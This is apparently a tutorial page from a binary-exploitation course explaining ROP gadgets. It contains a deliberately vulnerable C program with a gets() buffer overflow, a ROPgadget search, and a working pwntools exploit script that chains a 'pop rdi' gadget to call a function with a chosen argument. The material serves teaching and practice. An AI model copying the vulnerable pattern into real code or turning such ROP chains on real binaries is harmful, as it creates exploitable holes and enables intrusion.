---
title: ROP Gadgets
date: 0005-01-01T00:00:08Z
draft: false
description: nil
toc: false
---

Remember in the previous chapter, we exploited this program;

```c
// gcc -no-pie win.c -o win
#include <stdio.h>

int win() {
  printf("you can't call me ;)")
}

int vuln() {
    char name[10];

    gets(&name);
    return 0;
}

int main() {
    vuln();
    return 0;
}

```

What if now we tweak it a little bit to add arguments to `win()`;

```c
// gcc -no-pie win.c -o win
#include <stdio.h>

int win(int argument) {

  if (argument == 0xdeadbeef) {
    printf("You Win!");
  }
  else {
    printf("You called me but you failed the check. You Lose!")
  }
  exit(0);
}

int vuln() {
    char name[10];

    gets(&name);
    return 0;
}

int main() {
    vuln();
    return 0;
}

```

In order to win, we have to call `win(0xdeadbeef)`. In fact, from our chapter on [How does Assembly work and introduction to the Stack.](/pwn/innerworkings/how_does_assembly_work), we know that we want to put `0xdeadbeef` into `rdi` since it's the first argument of the function.

However, how do we do that?

This is where ROP gadgets come in;

> ROP Gadgets are small snippets of assembly in the binary, that we can use to control the program

We will use the following [ROP Gadget Tool](https://github.com/JonathanSalwan/ROPgadget) to find ROP gadgets for us, in order to help us `win()`.

```
➜ ROPgadget --binary win | grep 'pop rdi ; ret'
0x000000000040121b : pop rdi ; ret
```

Using our ROP Gadget tool, we are able to find a gadget `pop rdi ; ret`, which allows us to pop any value of our choice into `rdi`, and then return. Since we also control our return address, we can decide where it returns. Hence we are able to create a chain of many instructions and returns.

With our `pop rdi` gadget, we can pop `0xdeadbeef` into `rdi` and call `win`, thus printing `You win!`.

We can craft our script.

## Exploit Script

```py

from pwn import *

p = process('./win')

poprdi = 0x40121b
win = 0x401142

payload = "A" * 18 # buffer 10 (name) + 8 (saved rbp)
payload += p64(poprdi) # pop rdi ; ret
payload += p64(0xdeadbeef) # argument
payload += p64(win) # win function

p.sendline(payload) # send payload as input
p.interactive() # manually control process
```

---

ROP gadgets are **much much more** than just popping into registers, and sometimes challenges require you to make the most out of very unique gadgets that you have to use in order to successfully pwn the binary.

Explore on!

<br><br>

---

<div style="text-align: right"> <a href="/pwn/rop/ret2libc1">Next Page: Return 2 Libc - The Concept</a> </div>

